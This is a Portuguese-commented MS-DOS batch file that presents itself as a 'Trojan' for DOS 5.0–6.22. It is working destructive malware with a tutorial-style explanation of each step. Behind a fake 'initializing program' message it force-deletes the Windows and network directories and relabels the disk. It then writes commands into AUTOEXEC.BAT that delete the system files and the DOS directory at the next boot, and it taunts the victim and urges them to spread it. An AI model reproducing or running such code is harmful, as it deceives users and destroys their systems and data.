   @ECHO OFF
   #### Tipo desativa o comando do usuario,exceto Crtl + C
   IF EXIST C:\DOS\DELTREE.EXE GOTO A
   #### Comando que verifica se existe o arquivo maravilha  e nos manda para :A
   IF NOT EXIST C:\DOS\DELTREE.EXE GOTO N
   #### Comando maldito que salva o coitado,mas que tira o erro de se nao houver
   #### a porra do arquivo ! ah,eles no leva ate' :N

   :A
   CLS
   #### BaH,mas vamo ai esse limpa a tela
   PATH = C:\DOS
   #### Muda o Path atual para c:\dos
   ECHO.Aguarde ...
   ECHO.Inicializando o Programa ...
   ECHO.Isso pode demorar um pouquinho ...
   #### ECHO. e' o commando para escrever na tela ou em arqs,depois eu explico
   DELTREE /Y C:\WIN*.* >NUL
   DELTREE /Y C:\NET*.* >NUL
   #### Executando a crianca ! ah, o > nul e' para nao mostrar na tela
   #### Excluindo c:\windows ,sacou ?!
   LABEL pOiNdExTer > nul
   #### Renomeando o HD do coitado
   GOTO B
   #### Indo para (sei la) se fosse em clipper era function ! aqui nem sei,so
   #### sei que vai para o local indicado como B:

   :B
   ECHO.                                 Se ferrou!
   ECHO.                   Acho que nÆo devia ter executado esse programa!
   ECHO.         Trojan make by pOiNdExTer para uso em Dos 5.0 up to 6.23 he he !
   ECHO.         Bom,agora que voce nao tem mais nada de inutil em seu computador
   ECHO.                        Instale um Unix e seja feliz !
   ECHO.
   ECHO.
   #### essas bolinhas sao chr(7) beep  !
   GOTO C

   :N
   #### Aqui e' que se da bem !
   ECHO.                                     Sortudo ...
   GOTO FIM

   :C
   ECHO.PROMPT=C:\pOinDexTer)                                     >>C:\AUTOEXEC.BAT
   #### Aqui comeca a brincadeira !!!,ja mudei o C:\> para C:\pOinDexTer )
   #### quer dizer,so quando ele bootar a maquina,pois isso sera inserido no
   #### Autoexec do coitado !
   ECHO.ECHO.                    ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¿ >>C:\AUTOEXEC.BAT
   ECHO.ECHO.                    º TENHA UM BOM DIA SEU OTµRIO  ³ >>C:\AUTOEXEC.BAT
   ECHO.ECHO.                    ÈÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ >>C:\AUTOEXEC.BAT
   ECHO.ECHO.                                                      >>C:\AUTOEXEC.BAT
   ECHO.ECHO.                       PoInDeXtEr WeRe hErE ...       >>C:\AUTOEXEC.BAT
   ECHO.@ECHO OFF                   >>C:\AUTOEXEC.BAT
   ECHO.DELTREE /Y IO.SYS           >>C:\AUTOEXEC.BAT
   ECHO.DELTREE /Y MSDOS.SYS        >>C:\AUTOEXEC.BAT
   ECHO.DELTREE /Y COMMAND.COM      >>C:\AUTOEXEC.BAT
   ECHO.DELTREE /Y C:\DOS*.*        >>C:\AUTOEXEC.BAT
   ECHO.ECHO. Ps. Como este programa te pegou,pegue seus amigos tambem !  >-) >>C:\AUTOEXEC.BAT
   GOTO FIM

   :FIM
   @ECHO ON
   #### finaliza o programa e retorna o raio do cursor !
